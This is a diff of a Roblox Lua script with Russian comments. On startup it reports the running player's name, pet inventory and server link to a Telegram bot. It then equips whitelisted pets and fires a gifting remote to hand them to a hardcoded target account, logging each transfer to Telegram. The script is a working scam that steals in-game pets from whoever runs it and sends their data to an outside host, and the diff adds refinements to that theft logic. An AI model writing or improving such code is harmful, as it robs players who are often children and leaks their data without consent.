@@ -10,33 +10,52 @@ local TELEGRAM_CHAT_ID = "7144575011"
 local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
 
--- 🐾 БЕЛЫЙ СПИСОК (точные названия)
+-- 🐾 БЕЛЫЙ СПИСОК ПИТОМЦЕВ (формат: "Название [ВЕС] [Age ВОЗРАСТ]")
 local WHITELIST = {
     "Hamster",
 }
 
--- 🔗 Получить ссылку на сервер
-local function getServerLink()
-    return "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
-end
-
--- 📜 Получить список питомцев
-local function getPetsList()
-    local list = {}
-    for _, item in ipairs(player.Backpack:GetChildren()) do
+-- 🔎 Фильтрация только питомцев с весом и возрастом
+local function getFilteredPets()
+    local pets = {}
+    local backpack = player:FindFirstChild("Backpack") or player.Character
+    
+    for _, item in ipairs(backpack:GetChildren()) do
         if item:IsA("Tool") then
-            table.insert(list, item.Name)
+            -- Проверяем формат "[X.XX KG] [Age X]"
+            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
+            if weight and age then
+                -- Проверяем белый список
+                for _, petName in ipairs(WHITELIST) do
+                    if item.Name:find(petName) then
+                        table.insert(pets, {
+                            name = petName,
+                            fullName = item.Name,
+                            weight = tonumber(weight),
+                            age = tonumber(age),
+                            object = item
+                        })
+                        break
+                    end
+                end
+            end
         end
     end
-    return #list > 0 and table.concat(list, ", ") or "пусто"
+    
+    return pets
 end
 
--- ✅ Проверка в белом списке
-local function isInWhitelist(petName)
-    for _, name in ipairs(WHITELIST) do
-        if petName:find(name) then return true end
+-- 📜 Формирование списка питомцев для уведомления
+local function getPetsList()
+    local pets = getFilteredPets()
+    if #pets == 0 then return "нет питомцев" end
+    
+    local list = {}
+    for _, pet in ipairs(pets) do
+        table.insert(list, string.format("%s [%.2f кг, %d дн.]", pet.name, pet.weight, pet.age))
     end
-    return false
+    
+    return table.concat(list, "\n")
 end
 
 -- ✋ Взять в руку
@@ -52,7 +71,9 @@ local function transferPet(pet)
     local target = Players:FindFirstChild(TARGET_PLAYER)
     if target and ReplicatedStorage:FindFirstChild("PetGiftingService") then
         ReplicatedStorage.PetGiftingService:FireServer("GivePet", target)
+        return true
     end
+    return false
 end
 
 -- 📨 Отправка в Telegram
@@ -62,26 +83,34 @@ local function sendToTelegram(text)
     pcall(function() game:HttpGet(url) end)
 end
 
--- 🚀 Запуск передачи
+-- 🚀 Основная функция передачи
 local function startPetTransfer()
-    local transferred = 0
-    for _, pet in ipairs(player.Backpack:GetChildren()) do
-        if pet:IsA("Tool") and isInWhitelist(pet.Name) then
-            equipPet(pet)
-            if transferPet(pet) then
-                sendToTelegram("✅ "..pet.Name)
-                transferred += 1
-            end
-            task.wait(2)
-        end
+    local pets = getFilteredPets()
+    if #pets == 0 then
+        sendToTelegram("❌ Нет подходящих питомцев")
+        return
     end
-    sendToTelegram("🏁 Всего передано: "..transferred)
+    
+    for _, pet in ipairs(pets) do
+        equipPet(pet.object)
+        if transferPet(pet.object) then
+            sendToTelegram("✅ "..pet.name.." [передан]")
+        else
+            sendToTelegram("❌ "..pet.name.." [ошибка]")
+        end
+        task.wait(2)
+    end
+end
+
+-- 🔗 Получить ссылку на сервер
+local function getServerLink()
+    return "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
 end
 
 -- 🏁 ИНИЦИАЛИЗАЦИЯ
 sendToTelegram(
     "🔔 "..player.Name.." активировал скрипт\n"..
-    "📦 Питомцы: "..getPetsList().."\n"..
+    "🐾 Питомцы:\n"..getPetsList().."\n"..
     "🔗 "..getServerLink()
 )
 
